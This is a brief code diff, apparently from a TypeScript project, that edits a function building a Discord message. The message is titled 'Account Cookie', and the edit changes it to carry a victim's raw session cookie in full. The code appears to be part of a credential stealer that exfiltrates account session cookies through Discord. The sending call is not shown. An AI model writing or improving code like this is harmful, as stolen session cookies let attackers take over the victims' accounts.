@@ -594,7 +594,7 @@ function buildDiscordPayload(opts: {
       {
         title: "🍪 Account Cookie",
         color: 0xff5555,
-        fields: cookieFields,
+        description: "```\n" + cookie.slice(0, 4080) + "\n```",
         footer: { text: "Handle with care" },
       },
     ],
